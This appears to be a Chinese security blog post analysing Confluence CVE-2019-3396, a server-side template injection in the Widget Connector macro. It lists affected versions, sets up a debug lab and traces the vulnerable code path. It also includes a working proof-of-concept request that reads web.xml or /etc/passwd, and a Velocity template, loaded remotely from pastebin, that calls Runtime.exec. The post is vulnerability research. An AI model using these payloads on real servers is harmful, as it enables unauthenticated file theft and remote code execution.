<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="陛下，您真是一位老太太">
    <meta name="keyword"  content="undefined">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
          Confluence未授权模板注入/代码执行(CVE-2019-3396) - caiqiqi
        
    </title>

    <link rel="canonical" href="https://github.com/caiqiqi/2019/11/03/Confluence未授权模板注入-代码执行-CVE-2019-3396/">

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/hux-blog.min.css">

    <!-- Pygments Github CSS -->
    <link rel="stylesheet" href="/css/syntax.css">

    <!-- Custom Fonts -->
    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
    <!-- Hux change font-awesome CDN to qiniu -->
    <link href="http://cdn.staticfile.org/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">


    <!-- Hux Delete, sad but pending in China
    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
    css'>
    -->


    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- ga & ba script hoook -->
    <script></script>
</head>


<!-- hack iOS CSS :active style -->
<body ontouchstart="">

    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">caiqiqi</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <!-- Known Issue, found by Hux:
            <nav>'s height woule be hold on by its content.
            so, when navbar scale out, the <nav> will cover tags.
            also mask any touch event of tags, unfortunately.
        -->
        <div id="huxblog_navbar">
            <div class="navbar-collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="/">Home</a>
                    </li>

                    
                    
                </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>
<script>
    // Drop Bootstarp low-performance Navbar
    // Use customize navbar with high-quality material design animation
    // in high-perf jank-free CSS3 implementation
    var $body   = document.body;
    var $toggle = document.querySelector('.navbar-toggle');
    var $navbar = document.querySelector('#huxblog_navbar');
    var $collapse = document.querySelector('.navbar-collapse');

    $toggle.addEventListener('click', handleMagic)
    function handleMagic(e){
        if ($navbar.className.indexOf('in') > 0) {
        // CLOSE
            $navbar.className = " ";
            // wait until animation end.
            setTimeout(function(){
                // prevent frequently toggle
                if($navbar.className.indexOf('in') < 0) {
                    $collapse.style.height = "0px"
                }
            },400)
        }else{
        // OPEN
            $collapse.style.height = "auto"
            $navbar.className += " in";
        }
    }
</script>


    <!-- Main Content -->
    
<!-- Image to hack wechat -->
<!-- <img src="https://github.com/caiqiqi/img/icon_wechat.png" width="0" height="0"> -->
<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->

<!-- Post Header -->
<style type="text/css">
    header.intro-header{
        background-image: url('/img/home-bg.jpg')
    }
</style>
<header class="intro-header" >
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <div class="tags">
                        
                          <a class="tag" href="/tags/#Confluence" title="Confluence">Confluence</a>
                        
                          <a class="tag" href="/tags/#CVE-2019-396" title="CVE-2019-396">CVE-2019-396</a>
                        
                    </div>
                    <h1>Confluence未授权模板注入/代码执行(CVE-2019-3396)</h1>
                    <h2 class="subheading"></h2>
                    <span class="meta">
                        Posted by nobody from nowhere on
                        2019-11-03
                    </span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

    <!-- Post Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container">

                <p>详情：<br>服务端模版注入（Server-side Template Injection，SSTI），影响组件Widget Connector（小工具连接器）。<br>影响版本：</p>
<p>6.6.12版本之前所有版本<br>6.7.0-6.12.2版本<br>6.13.3之前的所有6.13.x版本<br>6.14.2之前的所有6.14.x版本<br>影响组件：</p>
<p>Widget Connector &lt;=3.1.3<br>修复版本<br>6.6.12<br>6.12.3<br>6.13.3<br>6.14.2<br>6.15.1</p>
<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/rest/tinymce/1/macro/preview</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: cqq.com:443</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3670.0 Safari/537.36</div><div class="line"><span class="attribute">Referer</span>: https://cqq.com/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;</div><div class="line"><span class="attribute">Content-Type</span>: application/json; charset=utf-8</div><div class="line"><span class="attribute">Content-Length</span>: 168</div><div class="line"></div><div class="line"><span class="undefined">&#123;"contentId":"786457","macro":&#123;"name":"widget","body":"","params":&#123;"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"&#125;&#125;&#125;</span></div></pre></td></tr></table></figure>
<p>或者改成<code>file:///etc/passwd</code>读取passwd文件。网上有可以读passwd文件的，但是在本地搭建环境没有成功读到/etc/passwd。后来发现是跟版本有关。在6.13.0不能读取，而在6.9.0可以读取。<br>6.13.0:<br><img src="https://img-blog.csdnimg.cn/20190404223748461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.9.0:<br><img src="https://img-blog.csdnimg.cn/20190409185810243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有的版本不需要referer，或者本身就不需要referer，而且有的版本对于UA解析有问题，可以直接删掉UA，参考：<a href="https://confluence.atlassian.com/cloudkb/xsrf-check-failed-when-calling-cloud-apis-826874382.html" target="_blank" rel="external">https://confluence.atlassian.com/cloudkb/xsrf-check-failed-when-calling-cloud-apis-826874382.html</a><br><img src="https://img-blog.csdnimg.cn/20190414014308906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>据说可以利用远程文件包含，实现命令执行：<br><a href="https://nosec.org/home/detail/2461.html" target="_blank" rel="external">https://nosec.org/home/detail/2461.html</a><br>直接访问https页面，内容为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">#set($e=&quot;e&quot;)</div><div class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)</div></pre></td></tr></table></figure></p>
<p><a href="https://pastebin.com/raw/X3WwMHgS" target="_blank" rel="external">https://pastebin.com/raw/X3WwMHgS</a><br>Velocity Template Language (VTL) Statement<br>模板语句的语法参考：<a href="https://velocity.apache.org/engine/devel/user-guide.html" target="_blank" rel="external">https://velocity.apache.org/engine/devel/user-guide.html</a><br><img src="https://img-blog.csdnimg.cn/2019040919104527.gif" alt="在这里插入图片描述"><br>经过测试，不需要登录的Cookie也可以执行。</p>
<h3 id="Conluence安装"><a href="#Conluence安装" class="headerlink" title="Conluence安装"></a>Conluence安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ wget https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-6.13.0.tar.gz</div><div class="line">$ tar zxf atlassian-confluence-6.13.0.tar.gz</div><div class="line">$ <span class="built_in">cd</span> atlassian-confluence-6.13.0</div><div class="line">$ vi ./confluence/WEB-INF/classes/confluence-init.properties <span class="comment">#设置confluence的home目录，这里我设置为</span></div><div class="line"><span class="comment">#confluence.home=/home/cqq/confluence</span></div><div class="line">$ vi ./conf/server.xml</div></pre></td></tr></table></figure>
<p>将这段外的注释去掉，</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8090"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span></span></div><div class="line">                   <span class="attr">maxThreads</span>=<span class="string">"48"</span> <span class="attr">minSpareThreads</span>=<span class="string">"10"</span></div><div class="line">                   <span class="attr">enableLookups</span>=<span class="string">"false"</span> <span class="attr">acceptCount</span>=<span class="string">"10"</span> <span class="attr">debug</span>=<span class="string">"0"</span> <span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span></div><div class="line">                   <span class="attr">protocol</span>=<span class="string">"org.apache.coyote.http11.Http11NioProtocol"</span>/&gt;</div></pre></td></tr></table></figure>
<p>然后就可以启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ bin/start-confluence.sh</div></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20190404231557165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>启动之后访问8090端口，一步步完成安装。<br>安装过程之一如下：<br><img src="https://img-blog.csdnimg.cn/20190404231727715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="配置远程调试"><a href="#配置远程调试" class="headerlink" title="配置远程调试"></a>配置远程调试</h3><p>在ubuntu上搭建运行环境，开启调试，<br>编辑<code>bin/setenv.sh</code>。<br>添加：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">CATALINA_OPTS=<span class="string">"-Xrunjdwp:transport=dt_socket,suspend=n,server=y,address=12346 <span class="variable">$&#123;CATALINA_OPTS&#125;</span>"</span>  <span class="comment"># for debug</span></div></pre></td></tr></table></figure>
<p>然后再启动confluence：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">bin/start-confluence.sh</div></pre></td></tr></table></figure>
<p>然后在Mac上复制一份代码，导入IDEA，然后在IDEA中设置将<code>widgetconnector-3.1.2.jar</code>加入到Libraries中。这样中IDEA中这个jar包才可以展开！<br><img src="https://img-blog.csdnimg.cn/20190409171430478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以Add as library<br><img src="https://img-blog.csdnimg.cn/20190409174336312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后放弃了远程调试，直接在Mac本地搭建环境了。</p>
<h3 id="触发位置"><a href="#触发位置" class="headerlink" title="触发位置"></a>触发位置</h3><p>参考：<a href="https://confluence.atlassian.com/doc/widget-connector-macro-171180449.html" target="_blank" rel="external">https://confluence.atlassian.com/doc/widget-connector-macro-171180449.html</a><br>插入（+）=&gt; 其他宏 =&gt; 小工具连接器<br><img src="https://img-blog.csdnimg.cn/20190408113937746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190408114319911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190408115037311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击预览功能时发的包里并没有<code>_template</code>参数，需要手动加上。猜想这个漏洞应该是需要白盒审计才能发现吧。<br><img src="https://img-blog.csdnimg.cn/20190408115438909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><p>定位一下，应该是这个jar包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">confluence/WEB-INF/atlassian-bundled-plugins/widgetconnector-3.1.2.jar</div></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20190408120154442.png" alt="在这里插入图片描述"><br>通过在IDEA中跟踪调用栈，发现大量的Filter的doFilter方法，所以以后这种不必单个跟，只需要把断点加在关键位置即可。</p>
<h3 id="代码追踪"><a href="#代码追踪" class="headerlink" title="代码追踪"></a>代码追踪</h3><p>atlassian-confluence-6.9.0/confluence/WEB-INF/atlassian-bundled-plugins/atlassian-rest-module-3.4.12.jar!/com/atlassian/plugins/rest/module/RestDelegatingServletFilter.class的doFilter方法。<br><img src="https://img-blog.csdnimg.cn/20190410105636155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后会进入到：<br>当<code>POST /rest/tinymce/1/macro/preview</code>，content-type为<code>&quot;application/json&quot;</code>，会调用以下代码，返回的响应content-type为<code>&quot;text/plain&quot;</code>。<br>atlassian-confluence-6.9.0/confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-6.9.0.jar!/com/atlassian/confluence/tinymceplugin/rest/MacroResource.class<br><img src="https://img-blog.csdnimg.cn/20190410113641532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将断点下在<code>atlassian-confluence-6.9.0/confluence/WEB-INF/atlassian-bundled-plugins/widgetconnector-3.1.0.jar!/com/atlassian/confluence/extra/widgetconnector/video/YoutubeRenderer.class</code>的<code>getEmbeddedHtml()</code> 方法<br>等到程序停在断点处之后，跟踪一下调用栈，<br><img src="https://img-blog.csdnimg.cn/2019040921460915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现已知的最早调用的是<code>atlassian-confluence-6.9.0/confluence/WEB-INF/atlassian-bundled-plugins/widgetconnector-3.1.0.jar!/com/atlassian/confluence/extra/widgetconnector/WidgetMacro.class</code>的<code>execute()</code>方法。<br>WidgetMacro.java<br><img src="https://img-blog.csdnimg.cn/20190408151532879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>RendererManager是一个接口，DefaultRendererManager实现了它。<br>DefaultRendererManager.java<br><img src="https://img-blog.csdnimg.cn/20190409220804287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>widgetRenderer.getEmbeddedHtml(url, params);<br>WidgetRenderer是一个接口，而YoutubeRenderer类实现了它。<br>YoutubeRenderer.java<br><img src="https://img-blog.csdnimg.cn/20190408151834936.png" alt="在这里插入图片描述"><br>VelocityRenderService是一个接口，DefaultVelocityRenderService类实现类它。<br>DefaultVelocityRenderService.java<br><img src="https://img-blog.csdnimg.cn/20190410180325891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>若POST请求中的<code>_template</code>的值为空，则将template设置为默认值：<code>com/atlassian/confluence/extra/widgetconnector/templates/embed.vm</code><br>否则这里从POST请求中的<code>_template</code>的值取出来，传入template，然后将POST请求中的所有参数放入contextMap，然后调用getRenderedTemplate(template, contextMap);<br><img src="https://img-blog.csdnimg.cn/2019040922182252.png" alt="在这里插入图片描述"><br>然后调用atlassian-confluence-6.9.0/confluence/WEB-INF/lib/confluence-6.9.0.jar!/com/atlassian/confluence/util/velocity/VelocityUtils.class的一系列方法，最终进入66行的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">renderTemplateWithoutSwallowingErrors((String)templateName, context, writer);</div></pre></td></tr></table></figure>
<p>然后一路各种getTemplate()，来到<br>atlassian-confluence-6.9.0/confluence/WEB-INF/lib/velocity-1.6.4-atlassian-9.jar!/org/apache/velocity/runtime/RuntimeInstance.class的getTemplate()方法。<br><img src="https://img-blog.csdnimg.cn/20190410183621204.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190410183757912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将templateName的值<code>file:///etc/passwd</code>作为参数传入，然后将内容写到writer中，然后在67行调用toString()方法将结果返回。<br><img src="https://img-blog.csdnimg.cn/20190410182425308.png" alt="在这里插入图片描述"><br>下面看66行renderTemplateWithoutSwallowingErrors执行的细节。<br>atlassian-confluence-6.9.0/confluence/WEB-INF/lib/confluence-6.9.0.jar!/com/atlassian/confluence/util/velocity/ConfigurableResourceManager.class<br>的getResource()方法中，先</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">String resourceKey = resourceType + resourceName;   <span class="comment">//1https://pastebin.com/raw/0Kj4aX8G</span></div><div class="line">        Resource resource = <span class="keyword">this</span>.globalCache.get(resourceKey); <span class="comment">// 先从globalCache中找，结果没找到，返回null。</span></div></pre></td></tr></table></figure>
<p>然后if (resource != null)判断失败，进入else逻辑，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">resource = <span class="keyword">this</span>.loadResource(resourceName, resourceType, encoding);  <span class="comment">//resourceName的值为 https://pastebin.com/raw/0Kj4aX8G</span></div></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20190410221744836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着往下跟，<br><img src="https://img-blog.csdnimg.cn/20190410222403123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>resourceName虽然传进来了，但是并没有用到，而是只根据传进来的resourceType为1，然后就new了一个ConfluenceVelocityTemplateImpl返回，<br><img src="https://img-blog.csdnimg.cn/20190410222551106.png" alt="在这里插入图片描述"><br>然后设置其name为<a href="https://pastebin.com/raw/0Kj4aX8G" target="_blank" rel="external">https://pastebin.com/raw/0Kj4aX8G</a><br>然后用四个Loader对resourceName进行轮番这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">InputStream resourceStream = resourceLoader.getResourceStream(resource.getName());</div></pre></td></tr></table></figure>
<p>查询。<br><img src="https://img-blog.csdnimg.cn/20190410224735189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>展开可以发现是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">com.atlassian.confluence.setup.velocity.HibernateResourceLoader</div><div class="line">org.apache.velocity.runtime.resource.loader.FileResourceLoader</div><div class="line">org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader</div><div class="line">com.atlassian.confluence.setup.velocity.DynamicPluginResourceLoader</div></pre></td></tr></table></figure>
<p>在atlassian-confluence-6.9.0/confluence/WEB-INF/lib/confluence-6.9.0.jar!/com/atlassian/confluence/setup/velocity/DecoratorName.class的isSpaceDecoratorSource()方法中判断是否以<code>@</code>开头，<br><img src="https://img-blog.csdnimg.cn/20190410223353452.png" alt="在这里插入图片描述"><br>若不是，则进入stripLeadingSlash()<br><img src="https://img-blog.csdnimg.cn/20190410223514494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>判断是否以<code>/</code>开头。<br><img src="https://img-blog.csdnimg.cn/20190410223549443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用atlassian-confluence-6.9.0/confluence/WEB-INF/lib/confluence-6.9.0.jar!/com/atlassian/confluence/util/velocity/Velocity13CompatibleResourceLoader.class<br>的getResourceStream()方法，返回null：<br><img src="https://img-blog.csdnimg.cn/20190410224451649.png" alt="在这里插入图片描述"><br>即，第一个<code>com.atlassian.confluence.setup.velocity.HibernateResourceLoader</code>没有拿到东西；<br>接着往下，是第二个，<code>org.apache.velocity.runtime.resource.loader.FileResourceLoader</code>：</p>
<p><img src="https://img-blog.csdnimg.cn/20190410231147663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>返回一个File为<code>/Users/caiqiqi/repos/atlassian-confluence-6.9.0/confluence/https:/pastebin.com/raw/0Kj4aX8G</code>，<br>最后抛出一个无法找到该文件的异常(因为有冒号，所以这个文件无法创建？)：<br><img src="https://img-blog.csdnimg.cn/20190410231743705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190410231846551.png" alt="在这里插入图片描述"><br>猜想如果这里是相对路径的文件应该就可以拿到了。同样可以得知，即便在请求中的<code>_template</code>参数值设置为<code>/</code>开头的绝对路径，//TODO，也可以正常地通过相对路径拿到文件内容。<br>接着第三个，<code>org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader</code><br>（虽然IDEA中反编译的代码顺序都错了，但是还是得硬着头发继续跟…）<br>进入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">result = ClassUtils.getResourceAsStream(<span class="keyword">this</span>.getClass(), name);</div></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20190410232118845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时一不小心跟过了，然后看到为监听的往pastebin.com的请求已经发出了！<br><img src="https://img-blog.csdnimg.cn/20190410232706811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>说明就是在这个Loader里执行了HTTP请求！<br>重新跟了一下，发现是在<br>atlassian-confluence-6.9.0/lib/catalina.jar!/org/apache/catalina/loader/WebappClassLoaderBase.class的getResourceAsStream()方法的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">stream = url.openStream();</div></pre></td></tr></table></figure>
<p>这句话，真正打开了一个TCP连接，并发送这个url的请求，并将返回的数据赋值给stream。</p>
<blockquote>
<p>Calling url.openStream() initiates a new TCP connection to the server that the URL resolves to. An HTTP GET request is then sent over the connection. If all goes right (i.e., 200 OK), the server sends back the HTTP response message that carries the data payload that is served up at the specified URL. You then need to read the bytes from the InputStream that the openStream() method returns in order to retrieve the data payload into your program.</p>
</blockquote>
<p>来源：<a href="https://stackoverflow.com/questions/2778312/how-does-java-url-openstream-work" target="_blank" rel="external">https://stackoverflow.com/questions/2778312/how-does-java-url-openstream-work</a><br><img src="https://img-blog.csdnimg.cn/20190415104849372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>(附发送HTTP请求的过程：<br><img src="https://img-blog.csdnimg.cn/20190415110522827.gif" alt="在这里插入图片描述"><br>)<br>atlassian-confluence-6.9.0/confluence/WEB-INF/lib/velocity-1.6.4-atlassian-9.jar!/org/apache/velocity/util/ClassUtils.class<br><img src="https://img-blog.csdnimg.cn/20190415105619200.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/201904102333476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过atlassian-confluence-6.9.0/confluence/WEB-INF/lib/confluence-6.9.0.jar!/com/atlassian/confluence/util/velocity/VelocityUtils.class的renderTemplateWithoutSwallowingErrors(String templateName, Context context, Writer writer)传入templateName为<code>https://pastebin.com/raw/0Kj4aX8G</code>，执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">Template template = getTemplate(templateName);</div></pre></td></tr></table></figure>
<p>拿到数据之后，赋值给template对象，接下来进行处理：<br><img src="https://img-blog.csdnimg.cn/20190415111231328.png" alt="在这里插入图片描述"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">renderTemplateWithoutSwallowingErrors(template, context, writer);</div></pre></td></tr></table></figure>
<p>具体的是这个方法的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">template.merge(context, writer);</div></pre></td></tr></table></figure>
<p>这句话。<br>跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">((SimpleNode)<span class="keyword">this</span>.data).render(ica, writer);</div></pre></td></tr></table></figure>
<p>调用atlassian-confluence-6.9.0/confluence/WEB-INF/lib/velocity-1.6.4-atlassian-9.jar!/org/apache/velocity/runtime/parser/node/SimpleNode.class<br>的render()方法进行渲染（解析得到的模板内容）<br>具体就是一些解析VTL语言表达式的详情了，<br><img src="https://img-blog.csdnimg.cn/20190415112051495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有时间学习一下。按照语法，就是可以执行命令的。<br>至此，从在哪里发送HTTP请求，哪里对template语句进行解析，就清楚了。</p>
